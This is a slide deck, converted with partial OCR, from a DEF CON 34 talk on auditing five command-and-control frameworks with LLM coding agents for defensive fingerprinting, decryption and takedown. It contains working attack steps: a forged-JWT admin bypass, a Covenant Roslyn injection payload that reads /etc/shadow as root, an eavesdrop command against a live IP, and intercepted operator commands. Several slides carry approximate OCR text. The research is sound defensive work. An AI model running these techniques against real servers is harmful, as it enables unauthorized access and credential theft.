---
title: "C(2)YA Inside the Adversary's Inbox"
speakers: ["Vitaly Simonovich"]
conference: "DEF CON"
conference_full: "DEF CON 34"
edition: "34"
year: 2026
source_pdf: "DEF CON 34/DEF CON 34 - Vitaly Simonovich - C(2)YA Inside the Adversary's Inbox - YAInsidethe Adversarys v1.pdf"
pages: 67
sha256: "c46743746818f53ffaa3c12448a24b30777aab0b7cb558a24ded09d8ccdd4f68"
text_chars: 24800
ocr_pages: 7
has_ocr: true
redacted_secrets: 0
ocr_confidence: 84.5
ocr_unreliable_blocks: 0
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T06:45:15Z"
---
# C(2)YA Inside the Adversary's Inbox

**Speakers:** Vitaly Simonovich  
**Conference:** DEF CON 34  
**Source:** `DEF CON 34/DEF CON 34 - Vitaly Simonovich - C(2)YA Inside the Adversary's Inbox - YAInsidethe Adversarys v1.pdf` (67 pages)


## Slide 1

###### **`Raise your hand.`**

01 02 03
→ →
now aim it at their
LLM → find the bugs …and it worked?
tools

## Slide 2

#### **`C(2)YA`**

\```
Inside the Adversary's Inbox
\```

\```
$ ws.connect("wss://target:40056/havoc/")  # no auth frame. just listen.
\```

## Slide 3

\```
// whoami
Vitaly Simonovich
\```

\```
Senior AI Security Researcher · Cato Networks
\```

- `AI Sec` **`·`** `Threat Intell` **`·`** `Vulnerability research`

PHOTO

round headshot

- `HashJack - first indirect prompt injection vs AI browser assistants`

- `Talked at RSAC, RootedCon, EkoParty, Qubit and more`

\```
10+
YEARS
\```

\```
21
CVEs
\```

\```
scan → LinkedIn
\```

## Slide 4

▸ `WHERE THIS STARTED`

\```
I was using coding agents to find bugs in
software.
\```

\```
Claude Code. Codex. Gemini.
Real findings in ML frameworks.
\```

\```
Why not …
\```

\```
C2 servers are just software too. Less audited. Who
cares?!
\```

## Slide 5

###### **`Their C2 is just software - so audit it.`**

\```
MOST PEOPLE RUNNING THESE DO AUTHORIZED RED-TEAM WORK -THIS CUTS BOTH WAYS, AND I'LL OWN THAT
\```

\```
Five independent teams. Five stacks. No shared lineage. All
with source code. All with bugs nobody looked for.
\```

## Slide 6

###### `// THE TARGETS`

###### **`Five C2 frameworks. Five independent stacks.`**

|`FRAMEWORK`|`STACK`|
|---|---|
|`havoc`|`C++ · Go/Qt`|
|`mythic`|`Go · Docker · Hasura`|
|`sliver`|`Go (BishopFox)`|
|`covenant`|`C# · Blazor`|
|`adaptixc2`|`Go · C++ · plugins`|

## Slide 7

###### **`Who’s actually running these frameworks.`**

\```
real-world attribution - nation-state APTs and ransomware crews, per public reporting
\```

|**FRAMEWORK**|**STACK**|**THREAT ACTORS OBSERVED IN THE WILD**|**`MOTIVATION`**|
|---|---|---|---|
|**Havoc**|**C++ · Go/Qt**|**APT36 (Transparent Tribe) · broad e-crime**|**`Nation-state +`**
**`cybercrime`**|
|**Mythic**|**Go · Docker · Hasura**|**APT36 — “Poseidon” agent**|**`Nation-state`**|
|**Sliver**|**Go (Bishop Fox)**|**APT29 (Cozy Bear/SVR) · FIN12 · BlackCat**|**`Nation-state +`**
**`cybercrime`**|
|**Covenant**|**.NET / C#**|**APT28 (Fancy Bear/GRU) — “Grunt”**|**`Nation-state`**|
|**AdaptixC2**|**Go · C++ plugins**|**Akira & Fog affiliates · CountLoader IAB**|**`Cybercrime`**|

\```
Attribution per public vendor / government reporting · most in-the-wild use is unattributed e-crime
\```

## Slide 8

\```
// THE QUESTION
\```

\```
Can I find vulnerabilities in C2
frameworks?
\```

\```
Enough for defenders to eavesdrop, fingerprint, and
take down those services.
\```

## Slide 9

# **`250`**

\```
Designflaws, behavioral weaknesses, and vulnerabilities. Five
frameworks.
\```

## Slide 10

##### **`Mythic alone: 114.`**

\```
THREE SYSTEMS DUCT-TAPED TOGETHER -HASURA · GRPC · DOCKER · ATTACK SURFACE IS PROPORTIONAL TO
COMPLEXITY
\```

\```
The others:
\```

\```
AdaptixC2 41 · Sliver 37 · Covenant 33 · Havoc 25.
\```

## Slide 11

\```
"I never logged in."
\```

## Slide 12

- `// ONE SCHEMA · 29 DIMENSIONS`

\```
Five separate lists tell you nothing. One dataset tells you
which mistakes all five teams shared.
\```

\```
Every finding rated the same way → comparable across frameworks.
\```

- **`Access tier (T0-T5)`** `- how much access the attacker needs. 85 findings need nothing but a public IP.`

- **`Defender-weighted severity`** `- not CVSS. Which bug finds the server?`

- **`Legal tier`** `- what's publishable vs what needs a court order. Drawn per finding, not after the fact.`

\```
Rate them all the same way → did five independent teams converge on the same blind
spots?
\```

## Slide 13

\```
CVSS doesn't tell you which bug finds
the server.
\```

\```
Defender-weighted severity: crown-jewel · high-
value · useful · situational · catalog-only
\```

\```
A Medium-CVSS fingerprinting bug that is how you
locate the C2ranks crown-jewel.
\```

## Slide 14

###### **`Five teams who never talked to each other built the same blind spots.`**

\```
CELLS = QUALITATIVE DENSITY (H PRIMARY · M SECONDARY · L PRESENT), NOT EXACT COUNTS
\```

HAVOC MYTHIC SLIVER COVENANT ADAPTIXC2
25 findings 114 findings 37 findings 33 findings 41 findings
Authorization missing
M H M H H
40+ instances
Crypto misuse
H M M M H
30+ instances
Plaintext secret storage M M H M M
IDOR L H M H H
Resource exhaustion H M H H H
Injection M H L M M
Nil deref and error handling H M H L M
Weak or missing authentication M H L H M

density: H primary

M secondary L present

## Slide 15

\```
Every framework assumes the only adversary is
the target machine.
\```

\```
None were built for someone with a login, a captured implant -
or no foothold at all.
\```

\```
Their C2 is just software. So we audit it.
\```

## Slide 16

# **`85`**

\```
findings reachable from the internet -fingerprint, exploit, or
observe -with zero prior access. No warrant, no credential, no
implant. Just a public IP.
\```

## Slide 17

###### ▸ `CRYPTO FAILURES`

\```
One key breaks it
all.
\```

## Slide 18

- `HAVOC · AES-CTR IV REUSE`

###### **`Reuse one IV, and the encryption cancels itself out.`**

\```
AES.new(key, MODE_CTR, nonce=b"", initial_value=iv)   # same IV, every message
\```

- **`1`** `Same IV` ⇒ `identical keystream on every message.`

- **`2`** `XOR two messages and the keystream cancels:` **`C1`** ⊕ **`C2 = P1`** ⊕ **`P2`**

- **`3`** `Crib a known command header` ⇒ `recover the keystream` ⇒ `decrypt everything.`

\```
  Or skip the math - the AES key ships in cleartext in packet #1 (DEMON_INIT).
\```

###### `WHAT A DEFENDER READS`

\```
Victim identity
\```

\```
host · domain · user
\```

\```
Operator tasking
every command issued
\```

\```
Agent output
keystrokes · files ·
screenshots
\```

## Slide 19

- `ADAPTIXC2 · PREDICTABLE KEY GENERATION`

###### **`One implant binary unlocks every agent on the listener.`**

✗ **`math/rand`** `→ seeded off the boot clock · reproducible` **`✓ crypto/rand`** `→ OS entropy · unpredictable   (what it should use)`

- **`1`** `Key made with math/rand` ⇒ `narrow seed space (~10⁹) - brute-forceable.`

- **`2`** `The same RC4 key is baked into every implant for that listener.`

- **`3`** `Grab one binary (VirusTotal · sandbox · disk)` ⇒ `extract the key` ⇒ `decrypt all traffic.`

\```
  RC4 is already broken - but here the real flaw is the key derivation.
\```

###### `WHAT A DEFENDER READS`

\```
One sample
\```

\```
from VirusTotal or a sandbox
\```

\```
Every agent
past & future traffic
\```

\```
Whole operation
commands · output · victims
\```

## Slide 20

- `SLIVER · PLAINTEXT KEY STORAGE`

###### **`No crypto to break - just read the database.`**

\```
sqlite3 sliver.db "SELECT * FROM implant_builds;"   # no SQLCipher
\```

- **`1`** `Every key lives in a SQLite DB - with no encryption (no SQLCipher).`

- **`2`** `One sliver.db = the CA, the server Ed25519 signing key, and every per-implant key.`

- **`3`** `Get the file (disk · backup · seizure)` ⇒ `SELECT` ⇒ `read it all.`

\```
  That Ed25519 key signs every task - own the file, and every implant obeys you.
\```

\```
WHAT A DEFENDER GETS
\```

\```
One file (T3)
\```

\```
disk · backup · seizure
\```

\```
Decrypt traffic
\```

\```
CA + per-implant keys
\```

\```
Forge commands
sign any task, fleet-wide
\```

## Slide 21

###### ▸ `FRAMEWORK SPOTLIGHT`

### **`One bug each.`**

## Slide 22

- `HAVOC · PRE-AUTH BROADCAST · DEMO 1`

###### **`No login. The server broadcasts to anyone listening.`**

① `connect · no auth frame` **`ATTACKER`** `public IP · T0` ② `NEW_AGENT broadcast · victim + AES key`

\```
HAVOC TEAMSERVER
:40056  /havoc/
\```

\```
NEW_AGENT   ·   streamed before authentication
\```

\```
Hostname "DESKTOP-ABC"    Domain "CORP"    User "jsmith"
AESKey "a1b2c3…"    AESIv "d4e5f6…"    ← per-agent keys, CLEARTEXT
\```

\```
Same socket, still no auth - also streams  OPERATOR_COMMAND · COMMAND_OUTPUT · LISTENER_ADD
\```

\```
  You never logged in. With the reused IV, that key decrypts everything.
\```

## Slide 23

- `MYTHIC · FORGED JWT (ParseUnverified)`

###### **`Set role=admin, skip the signature, sign in.`**

HEADER PAYLOAD  (forged) SIGNATURE
alg · typ . user_id:"attacker" · role:"admin" . ✗  never verified
claims, _, _ := new(jwt.Parser).ParseUnverified(token, &Claims{})    // signature skipped

- **`1`** `Forge a JWT - set role:"admin". Sign with any key, or alg:none.`

- **`2`** `Send it to the Hasura GraphQL API in the Authorization header.`

- **`3`** `Mythic trusts the claims` ⇒ `full admin. No real credentials.`

\```
  Hasura is multi-tenant - one forged token reads every team's operations, victims, and
loot.
\```

## Slide 24

###### ▸ `COVENANT · ROSLYN RCE · DEMO 2`

###### **`A “config field” that Covenant compiles and runs - as root.`**

\```
profile.cs   ·   MessageTransform  (operator-editable)
\```

###### **`Edit the field`**

\```
a C# string in the profile
\```

1 public static string Transform(byte[] b) {
2
    Process.Start("/bin/sh","-c ...");
3
    return Convert.ToBase64String(b);
4
}

\```
Roslyn compiles it
in-process · no sandbox
\```

uid=0 · root

↳ compiled in-process by Roslyn - no sandbox.

\```
in the Docker container
\```

\```
Path  User creds → self-promote (Blazor/SignalR IDOR) → edit field → restart listener → RCE
\```

\```
  Root in the container - victim DB, operator logs, harvested creds - and a shot at the
host.
\```

## Slide 25

- `ADAPTIXC2 · TWO ROADS IN · 2024 ENTRANT`

###### **`The newest framework - two independent ways in.`**

\```
T1 · NETWORK
\```

\```
T2 · ONE BINARY
\```

###### **`MITM the operator`**

###### **`Crack one implant`**

- `Qt TLS =` **`VerifyNone`** `→ accepts any cert`

   - `RC4 key from` **`math/rand`** `- reused`

- `Sit in the middle; present your cert`

   - `Pull one binary (VirusTotal / sandbox)`

- `Client accepts silently → read the API`

   - `Extract the baked-in key`

- **`→ Bearer token = you're the operator`**

   - **`→ decrypt all traffic, every agent`**

- `Two independent roads - either one, and` **`you ARE the operation`** `.`

## Slide 26

- `FROM BUGS TO attack chains`

\```
named attack chains
not 250 separate bugs - operational playbooks
43
\```

\```
not 250 separate bugs - operational playbooks
\```

Fingerprint Recover keys Read the op
find the server · T0 crypto-misuse findings victims · tasking · output

`Each chain composes` **`3-6 findings`** `-  zero access` ⇒ `reading the live operation.`

## Slide 27

\```
Havoc -the most common of the five I scanned
-was archived in February 2026.
\```

\```
No patches. No security reports accepted. Everything I found
stays exploitable.
\```

###### **`Good for Defenders!`**

## Slide 28

▸ `DEEP DIVE`

\```
One bug. End to
end.
\```

## Slide 29

- `DEEP DIVE · HOW AES-CTR BREAKS`

###### **`AES-CTR builds a keystream - reuse the IV and it repeats.`**

`AES(key)` ⊕ `plaintext` **`IV + counter keystream ciphertext`** `the starting value pseudo-random bytes on the wire` **`↑ fixed every message`** `Two messages, same reused keystream KS: C1 = P1` ⊕ `KS      C2 = P2` ⊕ `KS` **`C1`** ⊕ **`C2 = P1`** ⊕ **`P2`** `← the keystream cancels`

\```
It's a one-time pad, used twice.  Fix = a fresh random IV per message.
\```

## Slide 30

▸ `DEEP DIVE · CRIB DRAGGING · NO KEY NEEDED`

###### **`You only have the ciphertexts. That's enough.`**

C1  ⊕  C2 = P1  ⊕  P2   -   keystream cancelled (just a PCAP)
C1 ⊕ C2 ?? ?? ?? ?? ?? ?? ?? ??
crib → H o s t n a m e
-
reveals D E S K T O P
slide the crib across every offset until the letters line up.

1943-1980

###### **`VENONA`**

\```
US SIGINT read Soviet cables -
because analysts reused one-
time-pad pages under wartime
pressure.
AES-CTR is a mechanical one-time
pad. Havoc reused the page.
\```

\```
No key. No network position. A captured PCAP + protocol knowledge = full plaintext.
\```

## Slide 31

###### ▸ `DEEP DIVE · THE KEY SHIPS IN CLEARTEXT`

###### **`You don't even need the math - the key is in packet #1.`**

\```
AES KEYAES IVencrypted metadata …
32 bytes · PLAINTEXT16B · PLAINTEXT(protected by the key above)
\```

\```
DEMON_INIT - an agent's first packet. The key + IV arrive before any encrypted data.
\```

###### **`THREE INDEPENDENT ROADS TO THE KEY - ANY ONE IS ENOUGH`**

- **`1`** `Fixed IV → crib the ciphertext alone`

\```
NO KEY
\```

- **`2`** `Key in DEMON_INIT → one PCAP capture`

\```
T1
\```

- **`3`** `Key in the pre-auth broadcast → one socket`

\```
T0
\```

\```
  Any one road → everything that agent ever sent:  victim · commands · output - past &
future.
\```

## Slide 32

\```
That one line is why a defender can
read a live operation.
\```

\```
primitive → recoverable key → full bidirectional plaintext →
victim list, tasking, output. Watch.
\```

## Slide 33

▸ `ACT 3`

### **`Testing it.`**

## Slide 34

###### **`The lab had to be real.`**

\```
VM teamservers. Operator clients logged in. Active agents. Simulated victims.
Not containers. Not toy configs.
\```

\```
If it only works in a stripped lab, it doesn't work.
\```

## Slide 35

###### **`Point a coding agent at the source. Make it argue with itself.`**

\```
The harness gives breadth. Every surviving finding was validated by hand, in a
lab-that was the slow part.
\```

\```
SYSTEM: You audit a C2 teamserver FROM THE DEFENDER's side. Trust the
operator only; implant, network, internet are hostile. Emit one
JSON finding: {file, line, bug_class, defender_gain, tier, poc}.
LOOP:   scan every module → candidate findings
skeptic pass: "refute each; cite the code that makes it false" → drop
\```

## Slide 36

###### **`The machine found the bugs. It didn't find these.`**

\```
The deep-dive bug a minute ago? A human had to reason about that one.
\```

▸ `Protocol-level state-machine bugs - exist across a packet sequence, not in any one function`

▸ `Cross-component trust flows - RabbitMQ bus, gRPC translation, the Roslyn compile path`

## Slide 37

###### **`I'm about to open one socket. No credentials. That's it.`**

\```
A Havoc teamserver is running. An operator is logged in, working victims.
From a separate machine -I connect.
I don't send an auth frame.
\```

\```
Watch what the server sends me.
\```

## Slide 38

▸ **`DEMO 1 · Havoc pre-auth tap`**

\```
→ no
python3 eavesdrop.py wss://20.217.198.114:40056/havoc/ -o evidence/
creds
\```

## Slide 39

###### **`No login. No commands. I received what the server broadcast.`**

|`INTELLIGENCE`|`SOURCE EVENT`|
|---|---|
|`Victim host / user / domain`|`NEW_AGENT`|
|`Per-agent AES key + IV`|`NEW_AGENT.Encryption`|
|`Live tasking & output`|`OPERATOR_COMMAND, COMMAND_OUTPUT`|
|`Real teamserver IPs, Discord webhooks`|`profile / LISTENER_ADD`|

## Slide 40


> Recovered by OCR — confidence 82/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
eee OR 8 Q Search sessions, agents, files...
Q Search tabs. eS +
python /Users/vitalys/My_place/defcon/lab/demos/demo1-havoc-tap/eavesdrop.py \
wss://20.217.198.114:40056/havoc/|
%¢/ new /agent conversation
```

## Slide 41

\```
What just happened -and what didn't.
\```

\```
Did:opened a socket · received what the server broadcast to any client
Didn't:send credentials · navigate a panel · issue commands · authenticate
A server that broadcasts to everyone has no access gate.
I was the recipient -not an interceptor.
\```

## Slide 42

\```
The lab proved the bugs exist. I wanted to
know if they work in the wild.
\```

## Slide 43

▸ `ACT 4`

### **`The real world.`**

## Slide 44

\```
Shodan. Censys. VirusTotal. One fingerprint.
http.headers_hash:"X-Havoc:true"
Unmodified Havoc deployments still answer with X-Havoc: true.
Against every hit: one thing only-the passive tap.
Open a socket. Receive what they broadcast.
\```

## Slide 45

# **`35`**

\```
distinct Havoc teamservers observed -deduped, over a multi-day
window. Real operators. Real victims. Watched passively. A
sample of the careless, not a census.
\```

## Slide 46

###### **`35 LIVE DEPLOYMENTS · 8 COUNTRIES · 5 SECTORS`**

\```
observed passively · anonymized - countries and industries as data points, no orgs named
\```

\```
SECTORS HIT
\```

\```
Education
\```

\```
Manufacturing
Legal
\```

\```
Biotech
\```

\```
Small business
\```

- `8 countries · positions illustrative - real telemetry anonymized`

## Slide 47

###### **`Watch enough of them and they stop being IPs. They become types.`**

- `The Student - school hours, manual keylogger, fights with UAC - full writeup:`

- `Cato CTRL, *Operation Poisson*`

- `The Mass Deployer - hundreds of agents, near-zero manual commands, worm-like`

- `The Infrastructure Builder - sets up persistence, then goes silent`

- `The Data Harvester - focused credential exfil`

- `The (apparent) Red-Teamer - clean TTPs, scoped targets, time-boxed`

## Slide 48

\```
Against live servers: passive receipt only.
\```

\```
DATA MINIMIZED · VICTIMS NOT DE-ANONYMIZED · REVIEWED WITH COUNSEL · TALK TO YOURS
\```

\```
One thing, against internet-exposed infrastructure:
open a socket, receive what the server broadcasts to any client.
No auth. No exploit. No command. No login.
Everything else -250 findings, both demos -in a lab I own.
\```

## Slide 49

- `CASE STUDY · OPERATION POISSON`

###### **`We watched all 33 days.`**

\```
One French-speaking operator (“Poisson”). Passive observation. Every command he typed.
\```

\```
33
\```

\```
DAYS · Mar 30 - May 1
\```

\```
339
COMMANDS TYPED
\```

\```
4
\```

\```
FRENCH VICTIMS
\```

\```
18
\```

\```
DAYS C2 DOWN - ACCESS
SURVIVED
\```

\```
  Proof, not prediction - taking down the C2 is no longer remediation.
\```

## Slide 50


> Recovered by OCR — confidence 90/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
INTERCEPTED - Every command captured by Cato CTRL
INITIAL COMPROMISE CHAIN (March 30 - April 2)
Shellcode VAC
Elevation
Persistance x3
senti.dll
sys.vbs
VirtualAlloc +
CreateThread into 12 Attempts
Explorer.exe (Victim 3)
3-Layer Matryoshka:
NET - Donut - Havoc
Demon
AES-Encrypted
Stager
Explorer.EXE
CREDENTIAL THEFT + SURVIVAL CHAIN (April 2- May 1) € 2
RustDesk Keylogger SSH + C2 Offline 18 Return +
(KeyL.zip) Tailscale Days Thales.zip
Secondary Channel 70-Line Python C2-Independent Apr 8 - Apr 26 Apr 26 - May
(Custom Relay) Manual Retrieval Access (Apr 7) Access Persists 1145 More Commands
== (Mar 30 - May 1, 2026) ~_ 339 Commands PD 4 French Victims
```

## Slide 51


> Recovered by OCR — confidence 82/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[ea 1. sys.vbs - VBScript Wrapper (1.1 KB) 120s sleep - AES-256-CBC decrypt - Invoke-Expression
oy 2. senti.dll - .Net Loader (3.1MB) Assembly::Load()-fileless
{or 3. Decoded Shellcode (80.941 bytes) Word - byte dictionary lookup
O 4. Donut ReflectivePE Loader (30 KB) XOR key=0x02 - position-independent
XOR key=0x0l - actual C2 implant
cmd exec | file transfer | screenshots | injection j
{> 3.1MB carrier file ——> 50KB implant. Five layers. Zero files written to disk.
```

## Slide 52


> Recovered by OCR — confidence 94/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
339 33 Days 4
commands March 30 - May 1, 2026 French Victims
intercepted C2 Commands
2026-04-12 10:21:17 UTC poisson@c2:~$ shell dir
2026-04-12 10:21:18 UTC < output truncated >
2026-04-12 10:21:32 UTC poisson@c2:~$ curl pois43...
2026-04-12 10:21:33 UTC < downloading >
2026-04-12 10:21:57 UTC poisson@c2:~$ powershell -ep bypass
2026-04-12 10:21:58 UTC < execution started >
2026-04-12 10:22:41 UTC poisson@c2:~$ tailscale.exe up
2026-04-12 10:22:42 UTC < establishing tunnel >
2026-04-12 10:23:10 UTC poisson@c2:~$ certutil -scinfo
2026-04-12 10:23:12 UTC < enumarating certificates >
2026-04-12 10:23:48 UTC poisson@c2:~$ Thal.exe
2026-04-12 10:23:49 UTC < launched >
Automotive SMB
France
Victim 2
Individual
France
Victim 3
Victim 4 TAILSCALE MESH VPN
Individual C2-INDEPENDENT
France TUNNEL
iv] C2 down 18 days.
Access still up.
```

## Slide 53


> Recovered by OCR — confidence 80/100 on the text kept, 66/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
owe 000 Havoc C2 Server
POISSON IONOS SE, Berlin
Ubuntu /home/avenger/ 0000) offtine Apr 8 - Apr 26 (18 days)
0000 Returned Apr 26 - May 1
Backblaze B2 (Free tier) ess 0000) Redirector Ea
wowsenti.duckdns.com
Backblaze B2 (Free tier) HTTPS Callbacks
Backblaze B2 (Free tier) oO oO 90
o SSH+Playbook (publicly readable) y Victim 1 Victim 2 Victim 3 Victim 4
‘ Automotive Individual Individual Individual
; : > SMB (Win 11, ASRock (3-min test,
ee ZN OPSEC Fail B760M) Apr 3)
C2-Independent Path
survided 18-day C2 outage
Tailscale Mesh VPN
(installed Apr 7)
Direct encrypted -
tunnel no C2 required
>
|
OpenSSH Server +
reverse tunnel
```

## Slide 54


> Recovered by OCR — confidence 91/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BEFORE: C2 ONLINE (Mar 30 - Apr 8)
Operator |
Poisson
o000
0000
0000
0000
OO
194 commands
Havoc C2
Redirector
217.154.162.45
Victim 3
C2 Offline: 18 DAYS (Apr 8 - Apr 26)
Operator
Poisson
Tailscale
Mesh VPN
Installed Apr 7
od
oO
C2 Offline -
Apr 8, 20:44 UTC
Redirector
OFFLINE
(Unreachable)
OpenssH +
reverse tunnel
Victim 3 (Win 11)
ACCESS PERSISTS
Scheduled task fired at every boot.
SSH listening. Mesh connected.
AFTER: C2 RETURNS (Apr 26 - May 1)
Tailscale
Mesh VPN
Installed Apr 7
Goa 0000
od
OO
Havoc C2
217.154.217.139
ONLINE
Redirector
217.154.162.45
ONLINE
Victim 3 (Win 11)
Agents reconnect -
no re-compromise
145 more commands | Thales.zip executed
Apr 30 | Final command Apr 30, 18:14 UTC
~
Mar 30 Apr2 Apr7 Apr 8 Apr 26 May 1 The operator planned for this.
First compromise > Keylogger > SSH + Tailscale > C2 dies C2 returns Final command Taking down a C2 is no longer remediation.
J
```

## Slide 55

###### **`Demo 2 - Teamserver compromise. Covenant. The pattern isn't just Havoc.`**

\```
operator credentials (User role) → self-promote
\```

\```
(Blazor UI bypasses the admin check) → Roslyn RCE
→ root in Docker.
\```

## Slide 56

▸ `DEMO 2 · COVENANT · SELF-PROMOTE TO ROOT`

###### **`A low-priv user to root, in four clicks through the UI.`**

\```
2
Inject C#
\```

\```
3
\```

\```
1
Self-promote
\```

\```
Restart listener
\```

\```
Edit User form,paste intoRoslyn compiles
set role=AdminMessageTransformit in-process
\```

\```
4
uid=0  root
\```

\```
in the Docker
\```

\```
container
\```

###### **`THE TRICK  ·  IDOR`**

\```
The REST API checks for admin. The SignalR hub (CovenantHub.CreateUserRole) never does.
Same action through the WebSocket, no authz check.
\```

###### `No 0-day. No memory corruption. Four UI steps reach` **`root`** `.`

\```
Entry: a User-role account (or a brute-forced 1-char password).
\```

## Slide 57

▸ `COVENANT · BUG 2 · MESSAGETRANSFORM ROSLYN RCE`

###### **`A config field, compiled in-process, run as root.`**

\```
messageTransformRoslyn compiles
C# you writeCSharpCompilation
\```

\```
messageTransform
\```

\```
Assembly.Load()Transform()
same process : uid=0runs every message
\```

\```
Trigger (Admin JWT):  PUT /profiles/http (inject)  >  PUT /listeners Stopped  >  Active (Roslyn fires)  >  POST :7444
(Transform runs)
\```

\```
the injected messageTransform:
public static string Transform(byte[] b){
  Process.Start("/bin/sh","-c id;cat /etc/shadow");
  File.WriteAllText("/tmp/_defender_out",out);
  return Convert.ToBase64String(b); }
\```

\```
$ docker exec covenant cat /tmp/_defender_out
uid=0(root) gid=0(root) groups=0(root)
Linux covenant-vm 6.17.0 ... x86_64 GNU/Linux
root:*:19345:0:99999:7:::
daemon:*:19345:0:99999:7:::
\```

\```
Unfixable by design: a traffic-shaping field. Arbitrary C#, in-process, as root.  Any
Administrator = RCE.
\```

## Slide 58


> Recovered by OCR — confidence 73/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
~/My_place/defcon/lab/demos/demo2-covenant-rce (0.073s)
clear
python rce.py [{- -]
% 2 new /agent conversation
WLLY WOO
```

## Slide 59

- `ACT 5`

### **`WHAT DEFENDERS DO WITH THIS`**

## Slide 60

## **`Find.`**

\```
85 T0 findings. No prior access. Just a public IP.
\```

\```
Havoc: X-Havoc: true· Sliver: CN=localhost· Covenant:
CN=Covenant· AdaptixC2: 443+4321
\```

## Slide 61

▸ `THEN`

###### **`Decrypt.`**

\```
The crypto that protects them exposes them.
\```

▸ `Havoc - AES-CTR nonce reuse · capture one PCAP or read the pre-auth broadcast`

▸ `AdaptixC2 - static RC4 key · pull from any implant binary`

▸ `Sliver - plaintext keys in SQLite · T3: disk / backup / seizure`

## Slide 62

###### **`Then watch.`**

\```
If the teamserver broadcasts, you can listen -
within the right authority.
A server that answers everyone has no access gate
to cross.
\```

## Slide 63

###### **`If you run these for real work: don't be the careless one.`**

\```
THIS RESEARCH CUTS BOTH WAYS -THE FINDINGS THAT HELP DEFENDERS ALSO KEEP YOUR ENGAGEMENTS OFF THIS SLIDE
\```

▸ `Front the teamserver behind a redirector / mTLS - never expose :40056 / :7443 raw`

▸ `Kill the pre-auth broadcast; require auth before any event stream`

- `Rotate keys; never ship the default profile or default creds`

- `Strip giveaway headers (X-Havoc) and default certs`

\```
(CN=Covenant/ localhost)
\```

## Slide 64

###### **`For law enforcement: evidence + attribution after a seizure.`**

\```
One query against a lawfully seizedserver = the full scope of the compromise.
\```

▸ `Victim lists, harvested credentials, command history - plaintext in the DB`

▸ `Operator activity logs: per-operator IDs, timestamps, every action - the attribution goldmine`

## Slide 65

\```
And taking the C2 down is not
remediation.
\```

\```
In the Operation Poisson case, the C2 went dark on2026-04-08-the
operator's
\```

\```
access didn't. OpenSSH+ a Tailscalemesh, installed the night
before, survived. The C2 returned 18 days later.
\```

\```
Remediation has to dismantle the resilient
access layer -not just the teamserver.
\```

## Slide 66

- `KEY TAKEAWAYS`

###### **`Point AI at the attackers' tools.`**

\```
1  Aim AI at their tools
\```

\```
The same LLM harness that
audits normal software audits
C2 frameworks. 250 findings
across 5 tools, one
researcher, six months.
\```

\```
2  Defender + LE
\```

\```
Not academic CVEs. Fingerprint
servers from the internet;
grab evidence and attribution
after a lawful seizure.
\```

\```
3  Monitor + decrypt
Passive pre-auth taps read the
operator's live tasking.
Reused IVs and plaintext keys
decrypt all C2 traffic from
one recovered key.
\```

\```
Their C2 is just software.  Point your research at it.
\```

## Slide 67

\```
Thank you
\```
